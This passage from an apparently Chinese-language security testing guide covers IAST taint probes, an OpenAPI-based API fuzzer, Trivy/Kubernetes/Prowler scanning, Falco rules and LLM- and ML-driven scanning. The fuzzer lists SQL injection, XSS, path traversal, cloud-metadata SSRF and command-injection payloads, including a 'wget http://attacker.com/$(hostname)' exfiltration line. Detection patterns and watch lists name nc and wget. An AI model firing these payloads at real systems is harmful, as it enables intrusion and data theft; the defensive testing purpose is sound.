      - method: "java.net.URL.openConnection*"
      - method: "org.apache.http.client.HttpClient.execute*"
      - method: "okhttp3.OkHttpClient.newCall*"
      - method: "org.springframework.web.client.RestTemplate.exchange*"
      - method: "org.springframework.web.reactive.function.client.WebClient.*"
    sanitizers:
      - method: "com.example.security.UrlValidator.isAllowed*"
    severity: "critical"
    cwe: "CWE-918"
EOF
```

**Python IAST探针（自定义实现）**:

```python
#!/usr/bin/env python3
"""Python IAST探针 — 基于运行时污点追踪"""

import sys, json, inspect, functools, threading
from typing import Set, List, Dict, Any

class IASTProbe:
    """运行时污点追踪探针"""
    
    def __init__(self):
        self.tainted_objects: Set[int] = set()
        self.sinks: Dict[str, List[str]] = {
            'sql_injection': [
                'execute', 'executemany', 'raw', 'extra',
                'raw_query', 'raw_sql'
            ],
            'command_injection': [
                'system', 'popen', 'call', 'run', 'check_output',
                'exec_command', 'spawn'
            ],
            'path_traversal': [
                'open', 'read', 'write', 'delete', 'mkdir',
                'send_file', 'send_from_directory'
            ],
            'xss': [
                'render_template', 'render_template_string',
                'mark_safe', 'format_html'
            ],
            'ssrf': [
                'urlopen', 'get', 'post', 'put', 'delete',
                'request', 'send'
            ],
            'deserialization': [
                'loads', 'load', 'Unpickler', 'yaml_load', 'yaml.load'
            ]
        }
        self.findings: List[Dict] = []
        self._lock = threading.Lock()
    
    def taint(self, value: Any) -> Any:
        """标记数据为污点（来自用户输入）"""
        if isinstance(value, (str, bytes, dict, list)):
            self.tainted_objects.add(id(value))
        return value
    
    def is_tainted(self, value: Any) -> bool:
        """检查数据是否被污染"""
        if isinstance(value, (str, bytes)):
            return id(value) in self.tainted_objects
        if isinstance(value, dict):
            return any(id(v) in self.tainted_objects for v in value.values())
        if isinstance(value, list):
            return any(id(v) in self.tainted_objects for v in value)
        return False
    
    def report_finding(self, vulnerability_type: str, details: Dict):
        """报告漏洞发现"""
        with self._lock:
            self.findings.append({
                'type': vulnerability_type,
                'timestamp': __import__('time').time(),
                'details': details
            })
    
    def instrument_sink(self, func, sink_type: str):
        """包装危险函数（Sink）以检测污点数据"""
        @functools.wraps(func)
        def wrapper(*args, **kwargs):
            # 检查所有参数是否被污染
            for arg in args:
                if self.is_tainted(arg):
                    self.report_finding(sink_type, {
                        'function': func.__name__,
                        'module': func.__module__,
                        'tainted_value': str(arg)[:200],
                        'stack_trace': inspect.stack()[1:5]
                    })
                    break
            for key, value in kwargs.items():
                if self.is_tainted(value):
                    self.report_finding(sink_type, {
                        'function': func.__name__,
                        'module': func.__module__,
                        'parameter': key,
                        'tainted_value': str(value)[:200],
                        'stack_trace': inspect.stack()[1:5]
                    })
                    break
            return func(*args, **kwargs)
        return wrapper

# 全局探针实例
iast_probe = IASTProbe()

# 集成到Flask应用
try:
    from flask import Flask, request
    original_request_class = request.__class__
    
    # Hook Flask Request获取参数
    original_get = original_request_class.args.__class__.__getitem__
    def tainted_get(self, key):
        value = original_get(self, key)
        return iast_probe.taint(value)
    
    # 应用到Django
    # from django.http import HttpRequest
    # ... 类似的hook逻辑
except ImportError:
    pass
```

### 6.4 API模糊测试（Fuzzing）

API模糊测试是DAST的高级形式，通过自动生成大量变异输入来发现API端点中的逻辑漏洞和边界条件问题。

```python
#!/usr/bin/env python3
"""API模糊测试引擎 — 基于OpenAPI规范"""

import json, random, string, requests
from typing import Dict, List, Any
from dataclasses import dataclass
from enum import Enum

class FuzzType(Enum):
    SQL_INJECTION = "sqli"
    XSS = "xss"
    COMMAND_INJECTION = "cmdi"
    PATH_TRAVERSAL = "path_traversal"
    SSRF = "ssrf"
    XXE = "xxe"
    FORMAT_STRING = "format_string"
    INTEGER_OVERFLOW = "integer_overflow"
    BUFFER_OVERFLOW = "buffer_overflow"
    AUTH_BYPASS = "auth_bypass"

@dataclass
class FuzzPayload:
    type: FuzzType
    payload: str
    description: str

class APIFuzzer:
    """基于OpenAPI规范的API模糊测试器"""
    
    def __init__(self, openapi_spec_path: str):
        with open(openapi_spec_path) as f:
            self.spec = json.load(f)
        self.base_url = self.spec.get('servers', [{}])[0].get('url', '')
        self.payloads = self._generate_payloads()
        self.results = []
    
    def _generate_payloads(self) -> List[FuzzPayload]:
        """生成模糊测试载荷"""
        payloads = []
        
        # SQL注入载荷
        sql_payloads = [
            "' OR '1'='1", "' OR 1=1--", "admin'--",
            "1; DROP TABLE users--", "1' UNION SELECT NULL--",
            "1' AND 1=1--", "' OR '1'='1' /*",
            "1' AND SLEEP(5)--", "' WAITFOR DELAY '0:0:5'--",
            "1'; SELECT pg_sleep(5)--",
        ]
        for p in sql_payloads:
            payloads.append(FuzzPayload(FuzzType.SQL_INJECTION, p, "SQL注入测试"))
        
        # XSS载荷
        xss_payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "javascript:alert(1)",
            "\"><script>alert(1)</script>",
            "<body onload=alert(1)>",
            "{{constructor.constructor('alert(1)')()}}",  # SSTI
            "${7*7}",  # EL injection
        ]
        for p in xss_payloads:
            payloads.append(FuzzPayload(FuzzType.XSS, p, "XSS测试"))
        
        # 路径遍历载荷
        path_payloads = [
            "../../../etc/passwd", "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd", "/etc/passwd",
            "file:///etc/passwd", "....//....//....//....//etc/passwd",
        ]
        for p in path_payloads:
            payloads.append(FuzzPayload(FuzzType.PATH_TRAVERSAL, p, "路径遍历测试"))
        
        # SSRF载荷
        ssrf_payloads = [
            "http://169.254.169.254/latest/meta-data/",  # AWS
            "http://metadata.google.internal/",  # GCP
            "http://100.100.100.200/latest/meta-data/",  # 阿里云
            "http://127.0.0.1:22", "http://localhost:6379",
            "gopher://127.0.0.1:6379/_INFO", "dict://127.0.0.1:6379/INFO",
            "file:///etc/passwd",
        ]
        for p in ssrf_payloads:
            payloads.append(FuzzPayload(FuzzType.SSRF, p, "SSRF测试"))
        
        # 命令注入载荷
        cmd_payloads = [
            "; id", "| id", "`id`", "$(id)", "&& id", "|| id",
            "; cat /etc/passwd", "| whoami", "`cat /etc/shadow`",
            "\nid\n", "; wget http://attacker.com/$(hostname)",
        ]
        for p in cmd_payloads:
            payloads.append(FuzzPayload(FuzzType.COMMAND_INJECTION, p, "命令注入测试"))
        
        # 整数溢出
        int_payloads = [
            "-1", "0", "2147483648", "999999999999999",
            "-999999999999999", "NaN", "Infinity", "null",
        ]
        for p in int_payloads:
            payloads.append(FuzzPayload(FuzzType.INTEGER_OVERFLOW, p, "整数溢出测试"))
        
        return payloads
    
    def fuzz_endpoint(self, path: str, method: str, parameters: List[Dict]) -> List[Dict]:
        """模糊测试单个端点"""
        findings = []
        url = f"{self.base_url}{path}"
        
        for param in parameters:
            param_name = param['name']
            param_location = param.get('in', 'query')
            original_type = param.get('schema', {}).get('type', 'string')
            
            for payload in self.payloads:
                # 根据参数类型选择载荷
                if original_type == 'integer' and payload.type != FuzzType.INTEGER_OVERFLOW:
                    continue
                if original_type == 'string' and payload.type == FuzzType.INTEGER_OVERFLOW:
                    continue
                
                try:
                    if method == 'GET':
                        params = {param_name: payload.payload}
                        resp = requests.get(url, params=params, timeout=10)
                    elif method == 'POST':
                        if param_location == 'body':
                            data = {param_name: payload.payload}
                            resp = requests.post(url, json=data, timeout=10)
                        else:
                            data = {param_name: payload.payload}
                            resp = requests.post(url, data=data, timeout=10)
                    
                    # 分析响应
                    finding = self._analyze_response(resp, payload, param_name, url)
                    if finding:
                        findings.append(finding)
                
                except Exception as e:
                    pass
        
        return findings
    
    def _analyze_response(self, resp, payload, param_name, url) -> Dict:
        """分析响应，检测异常"""
        text = resp.text.lower()
        
        # SQL注入检测
        if payload.type == FuzzType.SQL_INJECTION:
            sql_errors = [
                'sql syntax', 'mysql_fetch', 'ora-', 'postgresql',
                'sqlite3.operationalerror', 'microsoft ole db',
                'odbc driver', 'sqlstate', 'syntax error'
            ]
            for err in sql_errors:
                if err in text:
                    return {
                        'type': 'SQL Injection',
                        'url': url,
                        'parameter': param_name,
                        'payload': payload.payload,
                        'evidence': err,
                        'severity': 'critical'
                    }
        
        # XSS检测
        if payload.type == FuzzType.XSS:
            if payload.payload.lower() in text:
                return {
                    'type': 'Cross-Site Scripting (XSS)',
                    'url': url,
                    'parameter': param_name,
                    'payload': payload.payload,
                    'evidence': 'Payload reflected in response',
                    'severity': 'high'
                }
        
        # SSRF检测
        if payload.type == FuzzType.SSRF:
            if 'ami-id' in text or 'security-groups' in text:
                return {
                    'type': 'SSRF (AWS Metadata)',
                    'url': url,
                    'parameter': param_name,
                    'payload': payload.payload,
                    'severity': 'critical'
                }
        
        # 路径遍历检测
        if payload.type == FuzzType.PATH_TRAVERSAL:
            if 'root:' in text or 'daemon:' in text or '[extensions]' in text:
                return {
                    'type': 'Path Traversal',
                    'url': url,
                    'parameter': param_name,
                    'payload': payload.payload,
                    'severity': 'critical'
                }
        
        return None
    
    def fuzz_all(self) -> List[Dict]:
        """模糊测试所有API端点"""
        all_findings = []
        paths = self.spec.get('paths', {})
        
        for path, methods in paths.items():
            for method in ['get', 'post', 'put', 'patch', 'delete']:
                if method in methods:
                    parameters = methods[method].get('parameters', [])
                    # 也检查requestBody
                    if 'requestBody' in methods[method]:
                        content = methods[method]['requestBody'].get('content', {})
                        if 'application/json' in content:
                            schema = content['application/json'].get('schema', {})
                            for prop_name, prop_schema in schema.get('properties', {}).items():
                                parameters.append({
                                    'name': prop_name,
                                    'in': 'body',
                                    'schema': prop_schema
                                })
                    
                    findings = self.fuzz_endpoint(path, method, parameters)
                    all_findings.extend(findings)
                    if findings:
                        print(f"[!] {method.upper()} {path}: {len(findings)} issues")
        
        return all_findings

# 使用示例
fuzzer = APIFuzzer('openapi.json')
findings = fuzzer.fuzz_all()
with open('api_fuzz_results.json', 'w') as f:
    json.dump(findings, f, indent=2)
print(f"Total findings: {len(findings)}")
```

---

## §7 容器与云安全扫描 (Container & Cloud Scanning)

### 7.1 概述

容器与云安全扫描在2026年已成为安全测试的必备环节。随着Kubernetes成为事实上的容器编排标准，以及多云/混合云架构的普及，安全扫描需要覆盖：容器镜像（Docker/OCI/containerd）、Kubernetes集群配置、云基础设施配置（AWS/Azure/GCP/阿里云/腾讯云）、服务网格（Istio/Linkerd）、以及Serverless函数（AWS Lambda/Azure Functions）。

核心技术栈：Trivy 0.55+、Grype 0.80+、Docker Scout、Kube-Bench 0.9+、Kube-Hunter、Prowler 4.0+、ScoutSuite 5.13+、Falco、Tetragon。

### 7.2 Trivy 容器镜像扫描

Trivy在2026年是最全面的容器安全扫描器，支持镜像、文件系统、Git仓库、Kubernetes集群、以及基础设施即代码（IaC）扫描。

```bash
# 安装Trivy
curl -sfL https://raw.githubusercontent.com/aquasecurity/trivy/main/contrib/install.sh | sh

# 扫描容器镜像
trivy image nginx:latest
trivy image --severity CRITICAL,HIGH python:3.12-slim
trivy image --scanners vuln,secret,misconfig myapp:latest

# 扫描本地文件系统（包括依赖）
trivy fs --scanners vuln,secret,misconfig \
  --severity CRITICAL,HIGH,MEDIUM \
  /path/to/project

# 扫描Git仓库
trivy repo https://github.com/org/repo.git

# 扫描Kubernetes集群
trivy k8s --namespace production --report summary cluster
trivy k8s --include-namespaces production,staging \
  --scanners vuln,misconfig,secret \
  --severity CRITICAL,HIGH \
  -o k8s_scan.json

# 扫描IaC配置（Terraform/CloudFormation/Helm）
trivy config --severity CRITICAL,HIGH ./terraform/
trivy config --severity CRITICAL,HIGH ./helm/

# 使用自定义策略
trivy image --policy /path/to/policy.rego --namespace users myapp:latest

# SBOM生成
trivy image --format cyclonedx --output sbom.json myapp:latest

# JSON输出用于CI/CD
trivy image --format json --output trivy_results.json \
  --exit-code 1 --severity CRITICAL,HIGH myapp:latest
```

**Trivy CI/CD集成 (GitHub Actions)**:

```yaml
name: Container Security Scan

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

jobs:
  trivy-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      
      - name: Build container image
        run: docker build -t myapp:${{ github.sha }} .
      
      - name: Run Trivy vulnerability scanner
        uses: aquasecurity/trivy-action@master
        with:
          image-ref: myapp:${{ github.sha }}
          format: sarif
          output: trivy-results.sarif
          severity: CRITICAL,HIGH
          exit-code: 1
          scanners: vuln,secret,misconfig
      
      - name: Upload Trivy results to GitHub Security
        uses: github/codeql-action/upload-sarif@v3
        with:
          sarif_file: trivy-results.sarif
      
      - name: Generate SBOM
        uses: aquasecurity/trivy-action@master
        with:
          image-ref: myapp:${{ github.sha }}
          format: cyclonedx
          output: sbom.json
      
      - name: Upload SBOM
        uses: actions/upload-artifact@v4
        with:
          name: sbom
          path: sbom.json
```

### 7.3 Kubernetes安全扫描

Kubernetes安全扫描需要覆盖多个层面：集群配置（Control Plane、etcd、kubelet）、工作负载安全（Pod Security Standards、RBAC、Network Policies）、以及运行时安全（Falco、Tetragon）。

```bash
# Kube-Bench: CIS Kubernetes Benchmark 合规检查
# 运行Kube-Bench（Master节点）
kube-bench run --targets master --version 1.30 --json > kube-bench-master.json

# 运行Kube-Bench（Worker节点）
kube-bench run --targets node --version 1.30 --json > kube-bench-node.json

# Kube-Hunter: Kubernetes渗透测试
kube-hunter --remote some.node.com --active --json > kube-hunter.json

# 在集群内部运行Kube-Hunter（Pod模式）
kubectl apply -f - << 'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: kube-hunter
spec:
  containers:
  - name: kube-hunter
    image: aquasec/kube-hunter:latest
    command: ["kube-hunter"]
    args: ["--pod", "--active", "--report", "json"]
    volumeMounts:
    - name: output
      mountPath: /tmp
  volumes:
  - name: output
    emptyDir: {}
  restartPolicy: Never
EOF

# 使用Kubescape进行安全扫描
kubescape scan framework nsa --format json --output kubescape.json
kubescape scan framework mitre --format pdf --output kubescape_mitre.pdf

# 使用kube-score进行配置最佳实践检查
kube-score score deployment.yaml --output-format json > kube-score.json

# Kubernetes RBAC审计
kubectl get clusterroles,roles -A -o json | \
  jq '.items[] | select(.rules[]?.resources[] | contains("*"))' > rbac_star_permissions.json

# 检测特权容器和hostNetwork
kubectl get pods -A -o json | jq '.items[] | 
  select(.spec.containers[]?.securityContext?.privileged == true) | 
  {namespace: .metadata.namespace, name: .metadata.name, privileged: true}' > privileged_pods.json

# 检测暴露的Dashboard
kubectl get svc -A -o json | jq '.items[] | 
  select(.metadata.name | test("dashboard|kubernetes-dashboard")) |
  {namespace: .metadata.namespace, name: .metadata.name, type: .spec.type}'
```

**Kubernetes安全扫描综合脚本**:

```python
#!/usr/bin/env python3
"""Kubernetes全面安全扫描"""

import subprocess, json, sys
from datetime import datetime

class K8sSecurityScanner:
    def __init__(self):
        self.results = {
            'timestamp': datetime.now().isoformat(),
            'cluster': {},
            'findings': []
        }
    
    def run_kube_bench(self):
        """运行CIS基准测试"""
        result = subprocess.run(
            ['kube-bench', 'run', '--targets', 'master', '--json'],
            capture_output=True, text=True
        )
        self.results['kube_bench'] = json.loads(result.stdout)
    
    def check_rbac(self):
        """检查RBAC配置"""
        # 检测ClusterRoleBindings
        cmd = "kubectl get clusterrolebindings -o json"
        result = subprocess.run(cmd.split(), capture_output=True, text=True)
        bindings = json.loads(result.stdout)
        
        for binding in bindings.get('items', []):
            # 检查是否绑定到system:anonymous
            for subject in binding.get('subjects', []):
                if subject.get('name') == 'system:anonymous':
                    self.results['findings'].append({
                        'severity': 'critical',
                        'category': 'RBAC',
                        'description': 'Anonymous user has cluster role binding',
                        'binding': binding['metadata']['name'],
                        'remediation': 'Remove anonymous user from ClusterRoleBinding'
                    })
    
    def check_pod_security(self):
        """检查Pod安全配置"""
        cmd = "kubectl get pods -A -o json"
        result = subprocess.run(cmd.split(), capture_output=True, text=True)
        pods = json.loads(result.stdout)
        
        for pod in pods.get('items', []):
            pod_name = pod['metadata']['name']
            namespace = pod['metadata']['namespace']
            
            for container in pod['spec'].get('containers', []):
                security_context = container.get('securityContext', {})
                
                # 检查特权模式
                if security_context.get('privileged'):
                    self.results['findings'].append({
                        'severity': 'critical',
                        'category': 'Pod Security',
                        'description': f'Privileged container: {container["name"]}',
                        'namespace': namespace,
                        'pod': pod_name,
                        'remediation': 'Remove privileged security context'
                    })
                
                # 检查以root运行
                if not security_context.get('runAsNonRoot'):
                    self.results['findings'].append({
                        'severity': 'high',
                        'category': 'Pod Security',
                        'description': f'Container may run as root: {container["name"]}',
                        'namespace': namespace,
                        'pod': pod_name,
                        'remediation': 'Set runAsNonRoot: true'
                    })
                
                # 检查capabilities
                capabilities = security_context.get('capabilities', {}).get('add', [])
                dangerous_caps = ['SYS_ADMIN', 'NET_ADMIN', 'SYS_PTRACE', 'SYS_MODULE']
                for cap in capabilities:
                    if cap in dangerous_caps:
                        self.results['findings'].append({
                            'severity': 'high',
                            'category': 'Pod Security',
                            'description': f'Dangerous capability: {cap}',
                            'namespace': namespace,
                            'pod': pod_name,
                            'remediation': f'Remove capability {cap}'
                        })
    
    def check_network_policies(self):
        """检查网络策略"""
        cmd = "kubectl get networkpolicies -A -o json"
        result = subprocess.run(cmd.split(), capture_output=True, text=True)
        policies = json.loads(result.stdout)
        
        namespaces_with_policies = set()
        for policy in policies.get('items', []):
            namespaces_with_policies.add(policy['metadata']['namespace'])
        
        cmd = "kubectl get namespaces -o json"
        result = subprocess.run(cmd.split(), capture_output=True, text=True)
        all_ns = json.loads(result.stdout)
        
        for ns in all_ns.get('items', []):
            ns_name = ns['metadata']['name']
            if ns_name not in namespaces_with_policies and ns_name not in ['kube-system', 'kube-public']:
                self.results['findings'].append({
                    'severity': 'medium',
                    'category': 'Network Policy',
                    'description': f'Namespace has no NetworkPolicy',
                    'namespace': ns_name,
                    'remediation': 'Apply NetworkPolicy to restrict traffic'
                })
    
    def run(self):
        """运行所有检查"""
        self.check_rbac()
        self.check_pod_security()
        self.check_network_policies()
        return self.results

scanner = K8sSecurityScanner()
results = scanner.run()
with open('k8s_security_scan.json', 'w') as f:
    json.dump(results, f, indent=2)
print(f"Total findings: {len(results['findings'])}")
```

### 7.4 云配置扫描 (Prowler / ScoutSuite)

云配置扫描是云安全的基础，需要检查数百项配置项，涵盖身份与访问管理（IAM）、网络安全、数据加密、日志审计、以及合规性要求。

```bash
# Prowler 4.0: AWS安全评估
# 安装Prowler
pip install prowler

# 运行所有检查
prowler aws --output-formats json-asff,html,csv \
  --output-directory prowler_output \
  --severity critical high medium

# 仅检查特定服务
prowler aws --services s3,iam,ec2,rds,lambda,cloudtrail,guardduty

# 检查特定合规框架
prowler aws --compliance cis_3.0_aws
prowler aws --compliance pci_dss_4.0_aws
prowler aws --compliance gdpr_aws
prowler aws --compliance nist_800_53_rev_5_aws

# 检查特定区域
prowler aws --region us-east-1,us-west-2,eu-west-1

# 多账户扫描（AWS Organizations）
prowler aws --organizations-role OrganizationAccountAccessRole

# Azure安全评估
prowler azure --output-formats json,html \
  --output-directory prowler_azure_output

# GCP安全评估
prowler gcp --project-ids my-project-123 \
  --output-formats json,html

# ScoutSuite: 多云安全评估
# 安装ScoutSuite
pip install scoutsuite

# AWS扫描
scoutsuite aws --report-name aws-security-report \
  --result-format json

# Azure扫描
scoutsuite azure --tenant my-tenant-id \
  --report-name azure-security-report

# GCP扫描
scoutsuite gcp --project-id my-project-id \
  --report-name gcp-security-report

# 阿里云扫描
scoutsuite aliyun --access-key-id $ALIYUN_ACCESS_KEY \
  --access-key-secret $ALIYUN_SECRET_KEY \
  --report-name aliyun-security-report
```

**Terraform基础设施即代码(IaC)扫描**:

```bash
# 使用tfsec扫描Terraform
tfsec . --format json --out tfsec_results.json

# 使用Checkov扫描
checkov -d . --framework terraform --output json \
  --output-file checkov_results.json

# 使用Terrascan
terrascan scan -d . --policy-type all \
  --output json -o terrascan_results.json

# 自定义Checkov策略
cat > custom_iac_checks.yaml << 'EOF'
metadata:
  name: "Ensure S3 buckets have encryption enabled"
  id: "CKV2_CUSTOM_1"
  category: "ENCRYPTION"
  severity: "HIGH"
definition:
  cond_type: "attribute"
  resource_types:
    - "aws_s3_bucket"
  attribute: "server_side_encryption_configuration.rule.apply_server_side_encryption_by_default.sse_algorithm"
  operator: "exists"
EOF

checkov -d . --external-checks-dir . --check CKV2_CUSTOM_1
```

### 7.5 运行时安全检测

运行时安全检测补充了静态扫描，通过eBPF等技术实时监控容器和系统的异常行为。

```bash
# Falco: 运行时威胁检测
# 安装Falco
helm repo add falcosecurity https://falcosecurity.github.io/charts
helm install falco falcosecurity/falco \
  --namespace falco --create-namespace \
  --set falcosidekick.enabled=true \
  --set falcosidekick.webui.enabled=true

# 自定义Falco规则
cat > custom_falco_rules.yaml << 'EOF'
- rule: Container Drift Detected
  desc: 检测容器文件系统变更
  condition: >
    evt.type in (open, openat, creat, mkdir, mknod, symlink) and
    container and
    not proc.name in (known_binaries) and
    not fd.directory in (known_dirs)
  output: >
    Container drift detected (user=%user.name command=%proc.cmdline
    container_id=%container.id image=%container.image.repository)
  priority: CRITICAL
  tags: [container, filesystem, drift]

- rule: Unexpected Outbound Connection
  desc: 检测容器到异常外部IP的连接
  condition: >
    evt.type = connect and
    container and
    fd.sport != 80 and fd.sport != 443 and
    fd.sip != "10.0.0.0/8" and fd.sip != "172.16.0.0/12" and
    fd.sip != "192.168.0.0/16"
  output: >
    Unexpected outbound connection (container=%container.name
    ip=%fd.sip port=%fd.sport command=%proc.cmdline)
  priority: WARNING
  tags: [network, container]
EOF

# Tetragon: 基于eBPF的安全监控
# 检测权限提升
tetra getevents -o compact --pods myapp \
  --processes curl,wget,nc,ncat,python,python3

# 检测网络连接
tetra getevents -o compact --pods myapp \
  --namespaces default,production \
  --event-types connect,accept
```

---

## §8 AI驱动扫描 (AI-Driven Scanning)

### 8.1 概述

2026年，AI驱动安全扫描已从概念验证阶段进入实战部署。AI技术正在深刻改变漏洞发现的范式：传统基于规则的扫描正向AI驱动的智能分析演进；基于LLM的代码审查正在成为SAST的核心组件；强化学习被用于自动化渗透路径规划；机器学习模型被用于异常检测和零日漏洞发现。

关键AI安全技术包括：LLM辅助漏洞发现、AI驱动的智能Fuzzing（AI Fuzzing）、机器学习异常检测、强化学习渗透路径规划、以及自然语言处理安全报告生成。

### 8.2 LLM驱动的漏洞发现

LLM在漏洞发现中的应用包括：代码审查辅助、漏洞利用脚本生成、安全报告自动编写、以及基于自然语言的安全需求分析。

```python
#!/usr/bin/env python3
"""LLM驱动的漏洞发现引擎"""

import json, asyncio, hashlib
from typing import List, Dict, Optional
from dataclasses import dataclass
from enum import Enum

class VulnerabilityType(Enum):
    INJECTION = "injection"
    BROKEN_AUTH = "broken_authentication"
    SENSITIVE_DATA = "sensitive_data_exposure"
    XXE = "xxe"
    BROKEN_ACCESS = "broken_access_control"
    SEC_MISCONFIG = "security_misconfiguration"
    XSS = "xss"
    INSECURE_DESERIAL = "insecure_deserialization"
    KNOWN_VULN = "known_vulnerability"
    INSUFFICIENT_LOGGING = "insufficient_logging"
    BUSINESS_LOGIC = "business_logic"

@dataclass
class AIFinding:
    vulnerability_type: VulnerabilityType
    severity: str  # critical, high, medium, low
    confidence: float  # 0.0 - 1.0
    file_path: str
    line_number: int
    code_snippet: str
    description: str
    cwe: str
    fix_suggestion: str
    exploit_scenario: str

class LLMVulnerabilityScanner:
    """基于LLM的智能漏洞扫描器"""
    
    SYSTEM_PROMPT = """你是一个世界级的应用安全专家，专门从事代码审计和漏洞发现。
你需要分析提供的代码片段，识别潜在的安全漏洞。
对于每个漏洞，你需要提供：
1. 漏洞类型（OWASP Top 10分类）
2. 严重程度（critical/high/medium/low）
3. 置信度（0.0-1.0）
4. 详细的漏洞描述
5. CWE编号
6. 具体的修复建议（含代码示例）
7. 可能的攻击场景

请特别注意以下2026年新兴的攻击模式：
- GraphQL深度嵌套查询导致的DoS
- WebSocket会话劫持
- Serverless函数的事件注入
- 微服务间的JWT令牌滥用
- WebAssembly模块的沙箱逃逸
- 容器镜像的供应链攻击"""

    CODE_ANALYSIS_PROMPT = """
请分析以下{language}代码，识别所有潜在的安全漏洞：

```{language}
{code}
```

文件路径: {file_path}

请以JSON格式返回分析结果：
```json
{{
  "findings": [
    {{
      "vulnerability_type": "injection/xss/...",
      "severity": "critical/high/medium/low",
      "confidence": 0.95,
      "line_number": 42,
      "description": "中文描述",
      "cwe": "CWE-89",
      "fix": "修复代码",
      "exploit": "攻击场景描述"
    }}
  ],
  "overall_security_rating": "A/B/C/D/F",
  "summary": "总体安全评估"
}}
```"""

    def __init__(self, model_provider: str = "anthropic", api_key: str = None):
        self.model_provider = model_provider
        self.api_key = api_key
        self.findings: List[AIFinding] = []
    
    async def analyze_code_segment(self, code: str, language: str, 
                                     file_path: str) -> List[Dict]:
        """分析代码片段（异步调用LLM）"""
        prompt = self.CODE_ANALYSIS_PROMPT.format(
            language=language,
            code=code[:10000],  # 限制长度
            file_path=file_path
        )
        
        # 调用LLM API
        response = await self._call_llm(prompt)
        return response.get('findings', [])
    
    async def analyze_file(self, file_path: str) -> List[AIFinding]:
        """分析单个文件"""
        # 检测语言
        ext_to_lang = {
            '.py': 'python', '.java': 'java', '.js': 'javascript',
            '.ts': 'typescript', '.go': 'go', '.rb': 'ruby',
            '.php': 'php', '.cs': 'csharp', '.rs': 'rust',
            '.swift': 'swift', '.kt': 'kotlin'
        }
        
        ext = file_path[file_path.rfind('.'):]
        language = ext_to_lang.get(ext, 'text')
        
        with open(file_path, 'r') as f:
            code = f.read()
        
        # 分块分析大文件
        findings = []
        if len(code) > 10000:
            chunks = [code[i:i+8000] for i in range(0, len(code), 8000)]
            for i, chunk in enumerate(chunks):
                chunk_findings = await self.analyze_code_segment(
                    chunk, language, f"{file_path}#chunk{i}"
                )
                findings.extend(chunk_findings)
        else:
            findings = await self.analyze_code_segment(code, language, file_path)
        
        return findings
    
    async def _call_llm(self, prompt: str) -> Dict:
        """调用LLM API"""
        # 实际实现调用Anthropic Claude / OpenAI GPT-4 / 本地LLM
        # 这里仅展示接口
        pass

class AIFuzzer:
    """AI驱动的智能模糊测试"""
    
    def __init__(self, target_url: str, openapi_spec: str = None):
        self.target_url = target_url
        self.spec = openapi_spec
        self.mutation_history = []
        self.coverage = set()
    
    def generate_intelligent_payloads(self, context: Dict) -> List[str]:
        """基于上下文AI生成针对性载荷"""
        # 使用LLM理解API功能并生成针对性载荷
        prompt = f"""
        基于以下API上下文，生成针对性的安全测试载荷：
        
        API端点: {context.get('endpoint')}
        HTTP方法: {context.get('method')}
        参数: {context.get('parameters')}
        描述: {context.get('description')}
        响应示例: {context.get('response_sample')}
        
        请生成10个可能触发漏洞的测试载荷，包括：
        - SQL注入变种
        - XSS变种
        - 命令注入
        - 路径遍历
        - 业务逻辑绕过
        """
        # 调用LLM生成载荷
        pass
    
    def reinforcement_learning_exploration(self, base_state: Dict) -> List[Dict]:
        """强化学习驱动的路径探索"""
        # 使用Q-Learning或PPO进行攻击路径优化
        # 状态: 当前应用状态（已认证、已访问的页面、发现的端点）
        # 动作: 尝试不同的攻击向量
        # 奖励: 发现新漏洞或新信息
        pass
```

### 8.3 机器学习异常检测

机器学习在安全扫描中的应用包括：Web流量异常检测、API滥用检测、用户行为分析（UEBA）、以及基于日志的入侵检测。

```python
#!/usr/bin/env python3
"""基于机器学习的Web异常检测"""

import numpy as np
import pandas as pd
from sklearn.ensemble import IsolationForest, RandomForestClassifier
from sklearn.preprocessing import StandardScaler, LabelEncoder
from sklearn.feature_extraction.text import TfidfVectorizer
import joblib
from typing import Dict, List, Tuple

class WebAnomalyDetector:
    """Web请求异常检测器"""
    
    def __init__(self):
        self.isolation_forest = IsolationForest(
            contamination=0.05,  # 5%异常率
            n_estimators=200,
            random_state=42
        )
        self.scaler = StandardScaler()
        self.vectorizer = TfidfVectorizer(max_features=500)
        self.is_trained = False
    
    def extract_features(self, requests: List[Dict]) -> np.ndarray:
        """从HTTP请求中提取特征"""
        features = []
        for req in requests:
            feat = [
                len(req.get('url', '')),
                len(req.get('body', '')),
                req.get('method', 'GET') == 'POST',
                req.get('method', 'GET') == 'PUT',
                req.get('method', 'GET') == 'DELETE',
                req.get('content_length', 0),
                req.get('header_count', 0),
                req.get('cookie_count', 0),
                self._count_special_chars(req.get('url', '')),
                self._count_special_chars(req.get('body', '')),
                self._has_sql_patterns(req.get('url', '') + req.get('body', '')),
                self._has_xss_patterns(req.get('url', '') + req.get('body', '')),
                self._has_path_traversal(req.get('url', '')),
                req.get('response_time_ms', 0),
                req.get('status_code', 200),
                req.get('response_size', 0),
            ]
            features.append(feat)
        return np.array(features)
    
    def _count_special_chars(self, text: str) -> int:
        return sum(1 for c in text if c in '<>{}[]()\'"`;,&|\\')
    
    def _has_sql_patterns(self, text: str) -> int:
        sql_patterns = [
            'union select', 'drop table', '1=1', '1=2',
            "' or '", "or 1=1", 'waitfor delay', 'sleep(',
            'information_schema', 'pg_sleep'
        ]
        return sum(1 for p in sql_patterns if p.lower() in text.lower())
    
    def _has_xss_patterns(self, text: str) -> int:
        xss_patterns = [
            '<script>', 'javascript:', 'onerror=', 'onload=',
            '<img', '<svg', 'alert(', 'document.cookie',
            'eval(', 'String.fromCharCode'
        ]
        return sum(1 for p in xss_patterns if p.lower() in text.lower())
    
    def _has_path_traversal(self, text: str) -> int:
        patterns = ['../', '..\\', '/etc/passwd', '/etc/shadow', 'boot.ini']
        return sum(1 for p in patterns if p.lower() in text.lower())
    
    def train(self, normal_requests: List[Dict]):
        """训练异常检测模型"""
        features = self.extract_features(normal_requests)
        features_scaled = self.scaler.fit_transform(features)
        self.isolation_forest.fit(features_scaled)
        self.is_trained = True
    
    def detect(self, request: Dict) -> Tuple[bool, float]:
        """检测单个请求是否异常"""
        if not self.is_trained:
            raise ValueError("Model not trained yet")
        
        features = self.extract_features([request])
        features_scaled = self.scaler.transform(features)
